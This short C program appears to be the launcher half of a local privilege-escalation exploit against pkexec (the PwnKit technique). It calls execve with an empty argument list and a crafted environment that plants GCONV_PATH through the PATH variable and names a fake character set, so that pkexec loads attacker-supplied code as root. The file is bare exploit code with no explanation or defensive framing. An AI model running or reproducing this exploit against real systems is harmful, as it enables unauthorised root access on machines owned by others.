#include <unistd.h>

int main()
{
    char* argv[] = { NULL };
    char* envp[] = {
        "iconvdata",
        "PATH=GCONV_PATH=.",
        "SHELL=/not/important",
        "CHARSET=EVIL-CHARSET-NAME",
        NULL
    };

    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}